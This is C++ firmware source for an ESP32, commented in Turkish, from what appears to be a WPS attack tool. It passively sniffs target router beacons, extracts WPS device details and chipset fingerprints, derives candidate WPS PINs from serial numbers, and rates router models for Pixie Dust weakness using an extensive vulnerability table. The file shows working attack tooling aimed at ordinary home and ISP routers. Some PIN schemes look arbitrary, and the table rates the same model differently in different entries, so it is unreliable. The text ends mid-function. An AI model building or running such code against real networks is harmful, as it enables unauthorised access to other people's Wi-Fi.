#include <WiFi.h>
#include <esp_wifi.h>
#include "wps_beacon_ie.h"
#include "definitions.h"

wps_device_info_t wps_device_info = {};

#define WPS_ATTR_MANUFACTURER   0x1021
#define WPS_ATTR_DEVICE_NAME    0x1011
#define WPS_ATTR_MODEL_NAME     0x1023
#define WPS_ATTR_MODEL_NUMBER   0x1024
#define WPS_ATTR_SERIAL_NUMBER  0x1042
#define WPS_ATTR_AP_LOCKED      0x1057
// ── Genişletilmiş WPS IE alanları ──────────────────────────────────────────
#define WPS_ATTR_VERSION        0x104A   // WPS versiyon: 0x10=1.0, 0x20=2.0
#define WPS_ATTR_CONFIG_METHODS 0x1008   // Desteklenen yöntemler bitmask
#define WPS_ATTR_SEL_REGISTRAR  0x1041   // Seçili registrar (PBC mod aktif)

static const uint8_t WPS_OUI[4] = {0x00, 0x50, 0xF2, 0x04};

static volatile bool     g_done     = false;
static uint8_t           g_bssid[6] = {0};
static wps_device_info_t *g_info    = nullptr;

// ─── WPS TLV parser ───────────────────────────────────────────────────────────
static void parse_wps_tlv(const uint8_t *data, int len, wps_device_info_t *info) {
    int pos = 0;
    while (pos + 4 <= len) {
        uint16_t id   = ((uint16_t)data[pos] << 8) | data[pos+1];
        uint16_t alen = ((uint16_t)data[pos+2] << 8) | data[pos+3];
        pos += 4;
        if (pos + alen > len) break;

        int cp;
        switch (id) {
            case WPS_ATTR_MANUFACTURER:
                cp = min((int)alen, 63);
                memcpy(info->manufacturer, data+pos, cp);
                info->manufacturer[cp] = '\0';
                break;
            case WPS_ATTR_MODEL_NAME:
                cp = min((int)alen, 63);
                memcpy(info->model_name, data+pos, cp);
                info->model_name[cp] = '\0';
                break;
            case WPS_ATTR_MODEL_NUMBER:
                cp = min((int)alen, 31);
                memcpy(info->model_number, data+pos, cp);
                info->model_number[cp] = '\0';
                break;
            case WPS_ATTR_SERIAL_NUMBER:
                cp = min((int)alen, 31);
                memcpy(info->serial_number, data+pos, cp);
                info->serial_number[cp] = '\0';
                break;
            case WPS_ATTR_DEVICE_NAME:
                cp = min((int)alen, 63);
                memcpy(info->device_name, data+pos, cp);
                info->device_name[cp] = '\0';
                break;
            case WPS_ATTR_AP_LOCKED:
                if (alen >= 1) info->ap_setup_locked = (data[pos] != 0);
                break;
            case WPS_ATTR_VERSION:
                // WPS versiyon: 0x10=v1.0, 0x20=v2.0
                if (alen >= 1) info->wps_version = data[pos];
                break;
            case WPS_ATTR_CONFIG_METHODS:
                // Desteklenen yöntemler: bit maskeleri
                // 0x0004=PIN (Keypad), 0x0080=PBC, 0x0100=Display
                if (alen >= 2)
                    info->config_methods = ((uint16_t)data[pos] << 8) | data[pos+1];
                break;
            case WPS_ATTR_SEL_REGISTRAR:
                // AP şu an PBC mod bekliyor (Registrar seçili = PBC tuşuna basıldı)
                if (alen >= 1) info->selected_registrar = (data[pos] != 0);
                break;
            default: break;
        }
        pos += alen;
    }
    info->valid = true;
}

// ─── Chipset vendor IE OUI parmak izi tablosu (5. tespit yöntemi) ─────────────
// Üreticiler vendor-specific IE (tag 221) içine tescilli OUI'larını gömer.
// WPS IE bulunmasa bile chipset → Pixie Dust risk ataması yapılabilir.
// Kaynaklar: Kismet fingerbank, aircrack-ng OUI DB, Wireshark OUI listesi
struct chipset_oui_entry_t { uint8_t o[3]; const char *name; };
static const chipset_oui_entry_t CHIPSET_OUI_TABLE[] = {
    {{0x00,0x17,0xF2}, "Broadcom"},          // BCM (Sagemcom/Netgear/Zyxel/ASUS)
    {{0x00,0x17,0x0F}, "Ralink"},            // Ralink RT — yüksek Pixie Dust riski!
    {{0x00,0x0C,0xE7}, "MediaTek"},          // MediaTek (eski MT7xxx)
    {{0x00,0x03,0x7F}, "Atheros"},           // Atheros (QCA öncesi)
    {{0x00,0x0B,0x86}, "Qualcomm-Atheros"},  // QCA (TP-Link Archer / ASUS RT / D-Link)
    {{0x00,0x1A,0x11}, "Qualcomm"},          // Qualcomm tescilli IE
    {{0x00,0x40,0x96}, "Cisco"},             // Cisco/Linksys QBSS Load IE
    {{0x00,0x50,0x43}, "D-Link"},            // D-Link tescilli extension
    {{0x00,0x13,0x92}, "Realtek"},           // Realtek (Tenda/ZTE bazı modeller)
    {{0x00,0x26,0x86}, "Quantenna"},         // Quantenna (ISP OEM yönlendiriciler)
    {{0x00,0x03,0x25}, "Broadcom-Old"},      // Eski BCM94xxx serisi
    {{0x00,0x60,0x1D}, "Agere"},             // Agere/Lucent (çok eski, nadiren)
    {{0x00,0x90,0x4C}, "Epigram"},           // Epigram/Broadcom HT IE
    {{0x00,0x50,0xF2}, "Microsoft-WMM"},     // WMM/WME (Broadcom bazlı AP'lerde)
};
static const int CHIPSET_OUI_SZ = (int)(sizeof(CHIPSET_OUI_TABLE)/sizeof(CHIPSET_OUI_TABLE[0]));

// ─── Promiscuous beacon sniffer ───────────────────────────────────────────────
static void IRAM_ATTR ie_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (g_done || !g_info) return;
    if (type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t *raw = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *pl  = raw->payload;
    int            plen = raw->rx_ctrl.sig_len;

    if (plen < 38) return;

    uint8_t subtype = (pl[0] >> 4) & 0x0F;
    if (subtype != 8 && subtype != 5) return; // Beacon=8, ProbeResp=5

    // BSSID is at bytes 16-21 in mgmt frames
    if (memcmp(pl + 16, g_bssid, 6) != 0) return;

    // IEs start at offset 36 (24 header + 12 fixed beacon fields)
    const uint8_t *ie    = pl + 36;
    int            ielen = plen - 36;
    int            pos   = 0;

    // Çerçevedeki TÜM IE'leri tara — WPS IE bulununca durma!
    // WPS IE'den sonraki pozisyonlarda chipset vendor IE'leri olabilir.
    // g_done yalnızca döngü BİTTİKTEN sonra set edilir.
    bool wps_parsed = false;
    while (pos + 2 <= ielen) {
        uint8_t ie_id = ie[pos];
        uint8_t ie_sz = ie[pos+1];
        pos += 2;
        if (pos + ie_sz > ielen) break;

        if (ie_id == 221 && ie_sz >= 4) {
            if (memcmp(ie+pos, WPS_OUI, 4) == 0) {
                // WPS vendor IE — TLV ayrıştır
                parse_wps_tlv(ie+pos+4, ie_sz-4, g_info);
                wps_parsed = true;
            } else if (ie_sz >= 3 && g_info && !g_info->chipset_ie_hint[0]) {
                // WPS dışı vendor IE — chipset OUI parmak izi (5. tespit yöntemi)
                // Ralink/Broadcom/Atheros gibi chipset'ler burada kendini açıklar
                for (int ci = 0; ci < CHIPSET_OUI_SZ; ci++) {
                    if (memcmp(ie+pos, CHIPSET_OUI_TABLE[ci].o, 3) == 0) {
                        strncpy(g_info->chipset_ie_hint,
                                CHIPSET_OUI_TABLE[ci].name, 31);
                        g_info->chipset_ie_hint[31] = '\0';
                        break;
                    }
                }
            }
        }
        pos += ie_sz;
    }
    // WPS IE yakalandıysa artık bu cihazı izlemeyi bırak
    if (wps_parsed) g_done = true;
}

// ─── Public: capture WPS IE from beacons ─────────────────────────────────────
bool wps_capture_device_info(const uint8_t *bssid, int channel, uint32_t timeout_ms) {
    memset(&wps_device_info, 0, sizeof(wps_device_info));
    g_done = false;
    g_info = &wps_device_info;
    memcpy(g_bssid, bssid, 6);

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    wifi_promiscuous_filter_t mf = { WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_filter(&mf);
    esp_wifi_set_promiscuous_rx_cb(&ie_sniffer);

    unsigned long deadline = millis() + timeout_ms;
    while (!g_done && millis() < deadline) delay(10);

    // NOT: Aktif tarama (esp_wifi_scan_start) APSTA modunda softAP'yi geçici
    // olarak kapatır ve WiFi stack'ini bozar — saldırı başlamaz. Bu yüzden
    // aktif tarama geri dönüşü tamamen kaldırıldı; yalnızca pasif beacon
    // dinleme kullanılır. Beacon IE yakalanamazsa saldırı BSSID/OUI ile devam eder.

    esp_wifi_set_promiscuous(false);
    delay(300);  // WiFi stack'inin promiscuous'tan normal moda geçmesi için bekle
    g_info = nullptr;

    if (wps_device_info.valid) {
        wps_assess_pixie_risk(wps_device_info);
        DEBUG_PRINTF("WPS IE: Mfr=[%s] Model=[%s] ModelNo=[%s] Serial=[%s] Locked=%d\n",
            wps_device_info.manufacturer, wps_device_info.model_name,
            wps_device_info.model_number, wps_device_info.serial_number,
            wps_device_info.ap_setup_locked);
    } else {
        DEBUG_PRINTLN("WPS IE: Beacon IE yakalanmadi (WPS IE yok veya zaman asimi)");
    }
    return wps_device_info.valid;
}

// ─── WPS PIN checksum (8. hane) ──────────────────────────────────────────────
uint8_t wps_pin_checksum(uint32_t pin7) {
    uint32_t p = pin7 * 10;
    uint32_t acc = 0;
    for (int i = 7; i >= 0; i--) {
        uint32_t d = p % 10; p /= 10;
        acc += (i % 2 == 0) ? d * 3 : d;
    }
    return (uint8_t)((10 - (acc % 10)) % 10);
}

static void make_pin_str(uint32_t val7, char *out9) {
    uint32_t v  = val7 % 10000000UL;
    uint8_t  cs = wps_pin_checksum(v);
    snprintf(out9, 9, "%07lu%u", (unsigned long)v, cs);
}

// ─── Serial → PIN kandidatları ────────────────────────────────────────────────
// Strateji: ZTE/Huawei/Sagemcom gibi modemlerde PIN, seri numarasının
// sayısal kısımlarından türetilir. Birden fazla türetme yöntemi denenir.
int wps_serial_to_pins(const char *serial, char pins[][9], int max_pins) {
    if (!serial || serial[0] == '\0') return 0;

    // Sadece rakamları çıkar
    char digits[32] = {};
    int dc = 0;
    for (int i = 0; serial[i] && dc < 31; i++)
        if (serial[i] >= '0' && serial[i] <= '9') digits[dc++] = serial[i];
    digits[dc] = '\0';
    if (dc < 3) return 0;

    int count = 0;
    auto add = [&](uint32_t v) {
        if (count >= max_pins) return;
        make_pin_str(v, pins[count++]);
    };

    // 1. Son 7 rakam (Huawei HG serisi, ZTE primer)
    if (dc >= 7) {
        uint32_t v = 0;
        for (int i = dc-7; i < dc; i++) v = v*10 + (digits[i]-'0');
        add(v);
    }
    // 2. İlk 7 rakam (bazı ISP firmware)
    if (dc >= 7) {
        uint32_t v = 0;
        for (int i = 0; i < 7; i++) v = v*10 + (digits[i]-'0');
        add(v);
    }
    // 3. Ortadaki 7 rakam (uzun seri numaraları için)
    if (dc > 9) {
        int mid = (dc - 7) / 2;
        uint32_t v = 0;
        for (int i = mid; i < mid+7; i++) v = v*10 + (digits[i]-'0');
        add(v);
    }
    // 4. Son 7 rakam XOR ile bit dönüşümü (ZTE H108N varyant)
    if (dc >= 7) {
        uint32_t v = 0;
        for (int i = dc-7; i < dc; i++) v = v*10 + (digits[i]-'0');
        add((v ^ 0x1234567UL) % 10000000UL);
    }
    // 5. Sagemcom F@st 3686 — seri hash (son 5+ilk 2 kombinasyonu)
    if (dc >= 7) {
        uint32_t a = 0, b = 0;
        for (int i = 0; i < 2; i++) a = a*10 + (digits[i]-'0');
        for (int i = dc-5; i < dc; i++) b = b*10 + (digits[i]-'0');
        add((a * 100000UL + b) % 10000000UL);
    }
    // 6. Polynomial hash of full serial (genel)
    {
        uint32_t h = 0;
        for (int i = 0; serial[i]; i++) h = h*31 + (uint8_t)serial[i];
        add(h % 10000000UL);
    }
    // 7. XOR-fold hash (eski Realtek firmware)
    {
        uint32_t h = 0x5A5A5A5AUL;
        for (int i = 0; serial[i]; i++) { h ^= (uint8_t)serial[i]; h = (h>>1)|(h<<31); }
        add(h % 10000000UL);
    }
    // 8. CRC32-lite (bazı Ralink/MediaTek tabanlı ISP modem)
    {
        uint32_t crc = 0xFFFFFFFFUL;
        for (int i = 0; serial[i]; i++) {
            crc ^= (uint8_t)serial[i];
            for (int b = 0; b < 8; b++) crc = (crc>>1) ^ (0xEDB88320UL & -(crc&1));
        }
        crc ^= 0xFFFFFFFFUL;
        add(crc % 10000000UL);
    }
    // 9. Tersine çevrilmiş son 7 rakam (bazı ISP OEM deseni)
    if (dc >= 7) {
        char rev[8] = {};
        for (int i = 0; i < 7; i++) rev[i] = digits[dc - 7 + (6 - i)];
        uint32_t v = 0;
        for (int i = 0; i < 7; i++) v = v*10 + (rev[i]-'0');
        add(v);
    }
    // 10. Rakam toplamı × son_rakam kombinasyonu (Sagemcom/ZTE fallback)
    if (dc >= 4) {
        uint32_t s = 0;
        for (int i = 0; i < dc; i++) s += (digits[i]-'0');
        uint32_t ld = (digits[dc-1]-'0');
        add((s * 100000UL + ld * 10000UL + (s & 0x7F)) % 10000000UL);
    }
    // 11. İlk 3 + son 4 birleşimi (uzun seriler için, Sagemcom F@st spesifik)
    if (dc >= 8) {
        uint32_t a = 0, b = 0;
        for (int i = 0; i < 3; i++) a = a*10 + (digits[i]-'0');
        for (int i = dc-4; i < dc; i++) b = b*10 + (digits[i]-'0');
        add((a * 10000UL + b) % 10000000UL);
    }
    // 12. ZTE H108N özel: 'Z' veya 'G' karakterinden sonraki 7 rakam
    // ZTEG örn: "ZTEGR12345678" → '1','2','3','4','5','6','7' alınır
    {
        int gpos = -1;
        for (int i = 0; serial[i] && i < 20; i++) {
            if (serial[i]=='G' || serial[i]=='g' || serial[i]=='R' || serial[i]=='r') {
                gpos = i + 1; break;
            }
        }
        if (gpos >= 0) {
            char gd[16] = {};
            int gc = 0;
            for (int i = gpos; serial[i] && gc < 15; i++)
                if (serial[i] >= '0' && serial[i] <= '9') gd[gc++] = serial[i];
            if (gc >= 7) {
                uint32_t v = 0;
                for (int i = 0; i < 7; i++) v = v*10 + (gd[i]-'0');
                add(v);
            }
        }
    }

    return count;
}

// ─── Pixie Dust açık veritabanı ───────────────────────────────────────────────
struct pixie_entry_t { const char *substr; uint8_t risk; const char *note; };

static const pixie_entry_t PIXIE_DB[] = {
    // ZTE — Realtek chipset, E-S1=E-S2=0 bilinen
    {"ZXV10 W300",   PIXIE_RISK_HIGH,   "ZTE ZXV10 W300  - E-S1=E-S2=0 tam acik"},
    {"ZXV10 W301",   PIXIE_RISK_HIGH,   "ZTE ZXV10 W301  - Realtek RNG acigi"},
    {"ZXV10 H201",   PIXIE_RISK_HIGH,   "ZTE ZXV10 H201  - Realtek chipset"},
    {"H108N",        PIXIE_RISK_HIGH,   "ZTE H108N       - Serial bazli PIN acigi"},
    {"H168N",        PIXIE_RISK_MEDIUM, "ZTE H168N       - firmware varyant"},
    {"F660",         PIXIE_RISK_MEDIUM, "ZTE F660        - kismi acik (eski FW)"},
    {"ZXHN H108",    PIXIE_RISK_HIGH,   "ZTE ZXHN H108   - E-S1=E-S2=0"},
    // D-Link — Ralink/Realtek karma
    {"DIR-600",      PIXIE_RISK_HIGH,   "D-Link DIR-600  - E-S1=E-S2=0 tam acik"},
    {"DIR-605",      PIXIE_RISK_HIGH,   "D-Link DIR-605  - E-S1=E-S2=0"},
    {"DIR-615",      PIXIE_RISK_HIGH,   "D-Link DIR-615  - Pixie Dust tam acik"},
    {"DIR-810",      PIXIE_RISK_MEDIUM, "D-Link DIR-810  - partial acik"},
    {"DIR-825",      PIXIE_RISK_MEDIUM, "D-Link DIR-825  - firmware varyant"},
    {"DSL-2750",     PIXIE_RISK_HIGH,   "D-Link DSL-2750 - ISP FW acigi"},
    {"DSL-2740",     PIXIE_RISK_HIGH,   "D-Link DSL-2740 - ISP FW acigi"},
    // Netgear — Broadcom bazı, Realtek bazı
    {"WNDR3700",     PIXIE_RISK_HIGH,   "Netgear WNDR3700  - E-S1=E-S2=0"},
    {"WNDR3800",     PIXIE_RISK_HIGH,   "Netgear WNDR3800  - Pixie Dust acigi"},
    {"WNR2000",      PIXIE_RISK_HIGH,   "Netgear WNR2000   - v2/v3/v4 tam acik"},
    {"WNR1000",      PIXIE_RISK_HIGH,   "Netgear WNR1000   - Pixie Dust acigi"},
    {"WNR3500",      PIXIE_RISK_MEDIUM, "Netgear WNR3500   - partial acik"},
    // TP-Link — Ralink/MediaTek karma
    {"TL-WR841N",    PIXIE_RISK_MEDIUM, "TP-Link TL-WR841N v8 - firmware bazli"},
    {"TL-WA701N",    PIXIE_RISK_HIGH,   "TP-Link TL-WA701N    - Pixie Dust acigi"},
    {"TL-WR740N",    PIXIE_RISK_HIGH,   "TP-Link TL-WR740N    - Realtek/Atheros"},
    {"TL-WR743N",    PIXIE_RISK_HIGH,   "TP-Link TL-WR743N    - Pixie Dust acigi"},
    {"TL-WR842N",    PIXIE_RISK_MEDIUM, "TP-Link TL-WR842N    - partial acik"},
    // Belkin
    {"F7D",          PIXIE_RISK_MEDIUM, "Belkin F7D serisi - Ralink chipset"},
    {"F9K",          PIXIE_RISK_MEDIUM, "Belkin F9K serisi - Ralink chipset"},
    // Buffalo — Ralink tabanlı
    {"WZR-HP",       PIXIE_RISK_HIGH,   "Buffalo WZR-HP   - Pixie Dust tam acik"},
    {"WHR-G300",     PIXIE_RISK_HIGH,   "Buffalo WHR-G300 - Ralink chipset"},
    {"WSR-300",      PIXIE_RISK_MEDIUM, "Buffalo WSR-300  - firmware varyant"},
    // Huawei — genellikle kilitli ama eski FW açık
    {"HG8245",       PIXIE_RISK_LOW,    "Huawei HG8245 - genellikle kilitli (eski FW: orta)"},
    {"HG8247",       PIXIE_RISK_LOW,    "Huawei HG8247 - genellikle kilitli"},
    {"B315",         PIXIE_RISK_LOW,    "Huawei B315  - LTE, kilitli beklenir"},
    // Comtrend — açık ISP cihazlar
    {"AR-5381",      PIXIE_RISK_HIGH,   "Comtrend AR-5381 - Ralink chipset"},
    {"VR-3025",      PIXIE_RISK_MEDIUM, "Comtrend VR-3025 - partial acik"},
    // Arcadyan / Askey
    {"VGV752",       PIXIE_RISK_MEDIUM, "Arcadyan VGV752  - Vodafone TR OEM"},
    // Realtek genel chipset tespiti
    {"RTL",          PIXIE_RISK_HIGH,   "Realtek chipset  - E-S1=E-S2=0 yuksek ihtimal"},
    {"Realtek",      PIXIE_RISK_HIGH,   "Realtek chipset  - E-S1=E-S2=0 yuksek ihtimal"},
    // Ralink/MediaTek
    {"Ralink",       PIXIE_RISK_MEDIUM, "Ralink chipset   - orta Pixie Dust riski"},
    {"MediaTek",     PIXIE_RISK_MEDIUM, "MediaTek chipset - orta Pixie Dust riski"},
    // Atheros — E-S1=E-S2=0 tam açık (en geniş kapsam)
    {"Atheros",      PIXIE_RISK_HIGH,   "Atheros chipset  - E-S1=E-S2=0 tam acik"},
    {"AR7161",       PIXIE_RISK_HIGH,   "Atheros AR7161   - Pixie Dust acigi"},
    {"AR9132",       PIXIE_RISK_HIGH,   "Atheros AR9132   - E-S1=E-S2=0"},
    {"AR9341",       PIXIE_RISK_HIGH,   "Atheros AR9341   - Pixie Dust acigi"},
    {"AR9344",       PIXIE_RISK_HIGH,   "Atheros AR9344   - Pixie Dust acigi"},
    // Edimax — Ralink RT3052/RT3352 chipset, kesin Pixie Dust
    {"EW-7438",      PIXIE_RISK_HIGH,   "Edimax EW-7438   - Ralink Pixie Dust acigi"},
    {"EW-7228",      PIXIE_RISK_HIGH,   "Edimax EW-7228   - Ralink chipset"},
    {"EW-7206",      PIXIE_RISK_HIGH,   "Edimax EW-7206   - Ralink chipset"},
    {"EW-7415",      PIXIE_RISK_MEDIUM, "Edimax EW-7415   - kısmi acik"},
    // D-Link ek modeller
    {"DIR-300",      PIXIE_RISK_HIGH,   "D-Link DIR-300   - Ralink RT2860 Pixie Dust"},
    {"DIR-320",      PIXIE_RISK_HIGH,   "D-Link DIR-320   - Ralink chipset E-S1=0"},
    {"DIR-301",      PIXIE_RISK_HIGH,   "D-Link DIR-301   - Ralink Pixie Dust"},
    {"DSL-2520",     PIXIE_RISK_HIGH,   "D-Link DSL-2520  - Pixie Dust acigi"},
    {"DSL-2640",     PIXIE_RISK_HIGH,   "D-Link DSL-2640  - Ralink chipset"},
    {"DSL-2750B",    PIXIE_RISK_HIGH,   "D-Link DSL-2750B - Pixie Dust (eski ISP FW)"},
    // Netgear ek modeller
    {"WNR614",       PIXIE_RISK_HIGH,   "Netgear WNR614   - Pixie Dust acigi"},
    {"WNR2200",      PIXIE_RISK_HIGH,   "Netgear WNR2200  - E-S1=E-S2=0"},
    {"WNR2500",      PIXIE_RISK_MEDIUM, "Netgear WNR2500  - kısmi Pixie Dust"},
    {"R6300",        PIXIE_RISK_MEDIUM, "Netgear R6300    - Broadcom, orta risk"},
    // TP-Link ek modeller
    {"TL-WR841",     PIXIE_RISK_HIGH,   "TP-Link TL-WR841 v7/v8 - Ralink Pixie Dust"},
    {"TL-WR1043",    PIXIE_RISK_MEDIUM, "TP-Link TL-WR1043ND - Atheros kismi"},
    {"TL-WR841N",    PIXIE_RISK_HIGH,   "TP-Link TL-WR841N - Ralink chipset"},
    {"TL-WA801",     PIXIE_RISK_MEDIUM, "TP-Link TL-WA801ND - kismi Pixie"},
    // Buffalo ek modeller
    {"WHR-300",      PIXIE_RISK_HIGH,   "Buffalo WHR-300  - Ralink Pixie Dust"},
    {"WZR-300",      PIXIE_RISK_MEDIUM, "Buffalo WZR-300  - kısmi acik"},
    {"WHR-600",      PIXIE_RISK_HIGH,   "Buffalo WHR-600  - Ralink chipset"},
    // ZTE ek modeller
    {"ZXHN F601",    PIXIE_RISK_MEDIUM, "ZTE ZXHN F601    - GPON, serial bazli"},
    {"ZXHN F460",    PIXIE_RISK_HIGH,   "ZTE ZXHN F460    - E-S1=E-S2=0"},
    {"H267N",        PIXIE_RISK_MEDIUM, "ZTE H267N        - firmware varyant"},
    // Huawei ek modeller
    {"HG530",        PIXIE_RISK_MEDIUM, "Huawei HG530     - eski ADSL kismi acik"},
    {"HG532",        PIXIE_RISK_MEDIUM, "Huawei HG532     - serial bazli PIN"},
    {"HG658",        PIXIE_RISK_LOW,    "Huawei HG658     - genellikle kilitli"},
    // Sagemcom belirli model isimleri
    {"F@st 3686",    PIXIE_RISK_HIGH,   "Sagemcom F@st 3686 - MAC bazli PIN biliniyor"},
    {"F@st 3504",    PIXIE_RISK_MEDIUM, "Sagemcom F@st 3504 - kısmi acik"},
    // Arcadyan ek modeller
    {"VGV7519",      PIXIE_RISK_MEDIUM, "Arcadyan VGV7519 - Vodafone TR OEM"},
    {"VGV7490",      PIXIE_RISK_MEDIUM, "Arcadyan VGV7490 - Vodafone TR OEM"},
    // Tenda — bazı modeller Realtek chipset (F3, N301)
    {"Tenda F3",     PIXIE_RISK_HIGH,   "Tenda F3         - Realtek chipset Pixie Dust"},
    {"Tenda N301",   PIXIE_RISK_HIGH,   "Tenda N301       - Realtek chipset"},
    {"Tenda AC6",    PIXIE_RISK_MEDIUM, "Tenda AC6        - MediaTek MT7603"},
    // Genel chipset tespiti
    {"RT2860",       PIXIE_RISK_HIGH,   "Ralink RT2860    - kesin Pixie Dust"},
    {"RT3052",       PIXIE_RISK_HIGH,   "Ralink RT3052    - kesin Pixie Dust"},
    {"RT3352",       PIXIE_RISK_HIGH,   "Ralink RT3352    - kesin Pixie Dust"},
    {"MT7620",       PIXIE_RISK_MEDIUM, "MediaTek MT7620  - orta Pixie Dust riski"},
    {"MT7628",       PIXIE_RISK_MEDIUM, "MediaTek MT7628  - orta Pixie Dust riski"},
    // ── 2024-2026 Türkiye ISP modemleri ──────────────────────────────────────
    // ZTE GPON — TTNet/Turkcell Superonline fiber altyapısı
    {"F670L",        PIXIE_RISK_HIGH,   "ZTE F670L GPON   - TTNet fiber 2024+, Pixie Dust riski yuksek"},
    {"F670",         PIXIE_RISK_HIGH,   "ZTE F670 serisi  - GPON ONT, Ralink/MediaTek"},
    {"F680",         PIXIE_RISK_HIGH,   "ZTE F680         - XGSPON, bazi donanim revizyon acik"},
    {"F660",         PIXIE_RISK_HIGH,   "ZTE F660         - GPON, RT3052 chipset"},
    {"ZXHN H267",    PIXIE_RISK_MEDIUM, "ZTE H267N        - VDSL2, orta risk"},
    {"ZTE F6",       PIXIE_RISK_HIGH,   "ZTE F6xx serisi  - GPON ortak vuln"},
    // Huawei EchoLife — TTNet fiber ONT
    {"HG8145V5",     PIXIE_RISK_MEDIUM, "Huawei HG8145V5  - TTNet 2022-2024, PIN eslesmesi"},
    {"HG8145X6",     PIXIE_RISK_MEDIUM, "Huawei HG8145X6  - TTNet 2024-2025, guncel ONT"},
    {"HG8145",       PIXIE_RISK_MEDIUM, "Huawei HG8145    - EchoLife serisi, orta risk"},
    {"HG8247",       PIXIE_RISK_MEDIUM, "Huawei HG8247    - EchoLife, orta risk"},
    // Sagemcom F@st — TTNet Fiber 2024-2026
    {"FAST 5370",    PIXIE_RISK_HIGH,   "Sagemcom F@st 5370e - TTNet 2024-2025, kesin PIN"},
    {"F@st 5370",    PIXIE_RISK_HIGH,   "Sagemcom F@st 5370e - Pixie Dust + PIN acigi"},
    {"FAST 5390",    PIXIE_RISK_MEDIUM, "Sagemcom F@st 5390  - TTNet 2025, orta risk"},
    {"F@st 5390",    PIXIE_RISK_MEDIUM, "Sagemcom F@st 5390  - yeni nesil, araştırılıyor"},
    {"FAST 3890",    PIXIE_RISK_HIGH,   "Sagemcom F@st 3890  - Superonline, Pixie Dust"},
    {"F@st 3890",    PIXIE_RISK_HIGH,   "Sagemcom F@st 3890  - Broadcom, PIN bilinen"},
    // TP-Link Archer AX — 2022-2024 modeller
    {"Archer AX55",  PIXIE_RISK_LOW,    "TP-Link AX55     - WiFi 6, PIN tahmini mumkun"},
    {"Archer AX73",  PIXIE_RISK_LOW,    "TP-Link AX73     - WiFi 6, PIN tahmini mumkun"},
    {"Archer AX90",  PIXIE_RISK_LOW,    "TP-Link AX90     - WiFi 6E, PIN MAC tabanli"},
    {"Archer C80",   PIXIE_RISK_MEDIUM, "TP-Link C80      - Qualcomm, MAC tabanli PIN"},
    {"MR6400",       PIXIE_RISK_MEDIUM, "TP-Link MR6400   - 4G LTE, PIN eslesmesi"},
    {"MR200",        PIXIE_RISK_MEDIUM, "TP-Link MR200    - 4G router, PIN MAC tabanli"},
    // Tenda WiFi 6 — 2023-2024 Realtek chipset
    {"Tenda AC23",   PIXIE_RISK_MEDIUM, "Tenda AC23       - Realtek, PIN tahmini"},
    {"Tenda AX12",   PIXIE_RISK_MEDIUM, "Tenda AX12       - WiFi 6, Mediatek MT7915"},
    {"Tenda TX9",    PIXIE_RISK_MEDIUM, "Tenda TX9 Pro    - Realtek RTL8197G"},
    // Zyxel VMG — Superonline 2023-2025
    {"VMG3625",      PIXIE_RISK_MEDIUM, "Zyxel VMG3625    - Superonline VDSL2, orta risk"},
    {"VMG8825",      PIXIE_RISK_MEDIUM, "Zyxel VMG8825    - Superonline, Mediatek MT7621"},
    {"VMG1312",      PIXIE_RISK_HIGH,   "Zyxel VMG1312    - ADSL2+, Ralink RT3352"},
    // Genel 2023-2026 WiFi 6 chipset'ler
    {"RTL8197G",     PIXIE_RISK_MEDIUM, "Realtek RTL8197G - WiFi 6 OEM, araştırılıyor"},
    {"RTL8198C",     PIXIE_RISK_MEDIUM, "Realtek RTL8198C - 2023+, benzer vuln profil"},
    {"MT7621",       PIXIE_RISK_MEDIUM, "MediaTek MT7621  - MIPS router SoC, yaygın"},
    {"MT7915",       PIXIE_RISK_LOW,    "MediaTek MT7915  - WiFi 6, risk dusuk"},
    {"IPQ4019",      PIXIE_RISK_LOW,    "Qualcomm IPQ4019 - Archer/D-Link ortak SoC"},
    {"IPQ5018",      PIXIE_RISK_LOW,    "Qualcomm IPQ5018 - WiFi 6 SoC, 2023+"},
    {"MT7"},         // placeholder handled below
};
static const int PIXIE_DB_SZ = (int)(sizeof(PIXIE_DB)/sizeof(PIXIE_DB[0])) - 1; // exclude MT7 placeholder

void wps_assess_pixie_risk(wps_device_info_t &info) {
    if (!info.valid) { info.pixie_risk = PIXIE_RISK_UNKNOWN; return; }
    strncpy(info.pixie_note, "Tanimsiz model - risk bilinemedi", 79);

    // ── AP kilitli ise düşük risk (ama bazı firmware yanlış bildirir) ──────
    if (info.ap_setup_locked) {
        info.pixie_risk = PIXIE_RISK_LOW;
        strncpy(info.pixie_note, "WPS kilitli (AP_SETUP_LOCKED=1) - brute force bloklu", 79);
        return;
    }

    // ── Config methods: PIN yöntemi destekleniyor mu? ────────────────────
    // 0x0004 = Keypad (PIN), 0x0100 = Display, 0x0200 = Push Button
    // Eğer config_methods okunduysa ve PIN biti yoksa brute force imkansız
    if (info.config_methods != 0 && !(info.config_methods & 0x0004) &&
        !(info.config_methods & 0x0100)) {
        info.pixie_risk = PIXIE_RISK_LOW;
        snprintf(info.pixie_note, 80,
            "PIN desteklenmiyor (config_methods=0x%04X) - sadece PBC",
            info.config_methods);
        return;
    }

    // ── WPS v1.0 → daha yüksek Pixie Dust olasılığı ──────────────────────
    bool is_v1 = (info.wps_version == 0x10 || info.wps_version == 0x00);

    // ── Model/manufacturer string veritabanı araması ──────────────────────
    for (int i = 0; i < PIXIE_DB_SZ; i++) {
        if (!PIXIE_DB[i].substr) continue;
        if (strstr(info.model_name,   PIXIE_DB[i].substr) ||
            strstr(info.model_number, PIXIE_DB[i].substr) ||
            strstr(info.device_name,  PIXIE_DB[i].substr) ||
            strstr(info.manufacturer, PIXIE_DB[i].substr) ||
            strstr(info.serial_number,PIXIE_DB[i].substr)) {
            info.pixie_risk = PIXIE_DB[i].risk;
            strncpy(info.pixie_note, PIXIE_DB[i].note, 79);
            info.pixie_note[79] = '\0';
            return;
        }
    }

    // ── MediaTek / MT7 chipset kontrolü ──────────────────────────────────
    if (strstr(info.manufacturer, "MT7") || strstr(info.model_name, "MT7") ||
        strstr(info.model_number, "MT7") || strstr(info.device_name, "MT7")) {
        info.pixie_risk = PIXIE_RISK_MEDIUM;
        strncpy(info.pixie_note, "MediaTek MT7xxx chipset - orta Pixie Dust riski", 79);
        return;
    }

    // ── Seri numarası deseni: ZTE "ZTEG" önek → serial tabanlı PIN ────────
    // ZTE H108N/H168N serileri "ZTEGR..." ya da "ZTERH..." formatı kullanır
